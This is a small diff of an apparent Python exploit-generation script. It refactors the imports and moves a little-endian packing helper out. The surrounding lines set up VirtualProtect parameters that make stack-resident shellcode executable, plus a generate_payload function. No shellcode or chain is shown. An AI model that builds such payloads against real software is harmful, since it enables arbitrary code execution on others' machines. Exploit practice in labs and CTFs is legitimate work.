@@ -1,5 +1,6 @@
+from util import *
+
 import os
-import struct
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 BIN_PATH = os.path.join(BASE_DIR, "test.bin")
@@ -22,10 +23,6 @@ VP_LP_ADDRESS = STACK_BASE
 VP_DW_SIZE = len(SHELL_CODE)
 VP_NEW_PROTECT = 0x40  # PAGE_EXECTE_READ_WRITE
 VP_OLD_PROTECT = STACK_BASE + len(SHELL_CODE)  # padding
-
-
-def le32(x: int) -> bytes:
-    return struct.pack("<I", x)
 
 
 def generate_payload() -> bytes:
